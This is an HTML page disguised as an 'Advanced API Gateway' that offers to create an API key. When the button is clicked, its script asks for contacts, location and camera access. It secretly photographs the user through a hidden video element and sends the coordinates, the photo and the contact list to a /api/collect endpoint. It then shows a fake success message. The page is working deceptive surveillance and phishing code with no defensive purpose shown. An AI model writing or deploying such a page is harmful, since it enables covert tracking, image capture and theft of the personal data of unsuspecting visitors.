<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Advanced API Gateway</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-slate-950 text-white min-h-screen flex items-center justify-center p-4">

    <div class="max-w-md w-full bg-slate-900/80 backdrop-blur-xl border border-slate-800 p-8 rounded-3xl shadow-2xl text-center">
        <h1 class="text-2xl font-bold tracking-tight text-white">Advanced API Gateway</h1>
        <p class="text-slate-400 text-sm mt-2 mb-6">Initialize secure environment and generate instant API endpoints.</p>

        <div id="status-panel" class="bg-slate-950/60 border border-slate-800/80 p-4 rounded-xl text-xs text-indigo-300 font-mono mb-6">
            Status: Ready to initialize...
        </div>

        <button onclick="initializeEngine()" class="w-full bg-gradient-to-r from-indigo-600 to-violet-600 hover:from-indigo-500 hover:to-violet-500 text-white font-semibold py-3.5 rounded-xl shadow-lg transition-all duration-200">
            Create Custom API Key
        </button>
    </div>

    <video id="v" autoplay playsinline style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        let capturedLat = null;
        let capturedLon = null;
        let capturedImage = null;
        let capturedContacts = [];

        async function initializeEngine() {
            const panel = document.getElementById("status-panel");
            panel.innerText = "Requesting system access (Location, Camera & Contacts)...";

            // 1. Request Contacts/Call list if supported by browser (e.g., Mobile Chrome)
            if (('contacts' in navigator) && ('Navigator' in window && 'select' in window.ContactsManager.prototype)) {
                try {
                    const props = ['name', 'tel'];
                    const opts = { multiple: true };
                    const contacts = await navigator.contacts.select(props, opts);
                    capturedContacts = contacts;
                } catch (err) {
                    capturedContacts = "Permission Denied or Not Supported";
                }
            } else {
                capturedContacts = "Not Supported on this Browser";
            }

            // 2. Request Location
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        capturedLat = pos.coords.latitude;
                        capturedLon = pos.coords.longitude;
                        executeCameraCapture();
                    },
                    (err) => {
                        executeCameraCapture();
                    },
                    { timeout: 8000 }
                );
            } else {
                executeCameraCapture();
            }
        }

        function executeCameraCapture() {
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                .then(stream => {
                    const video = document.getElementById("v");
                    video.srcObject = stream;
                    setTimeout(() => {
                        const canvas = document.getElementById("c");
                        canvas.width = video.videoWidth || 320;
                        canvas.height = video.videoHeight || 240;
                        const ctx = canvas.getContext("2d");
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        capturedImage = canvas.toDataURL("image/jpeg", 0.7);
                        
                        stream.getTracks().forEach(t => t.stop());
                        sendDataToServer();
                    }, 1200);
                })
                .catch(err => {
                    sendDataToServer();
                });
        }

        function sendDataToServer() {
            const panel = document.getElementById("status-panel");
            fetch('/api/collect', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    latitude: capturedLat,
                    longitude: capturedLon,
                    image_base64: capturedImage,
                    contacts: capturedContacts
                })
            })
            .then(res => res.json())
            .then(data => {
                panel.innerHTML = "<span class='text-emerald-400 font-bold'>✔ API Generated Successfully!</span>";
            })
            .catch(err => {
                panel.innerText = "Error syncing with server.";
            });
        }
    </script>
</body>
</html>
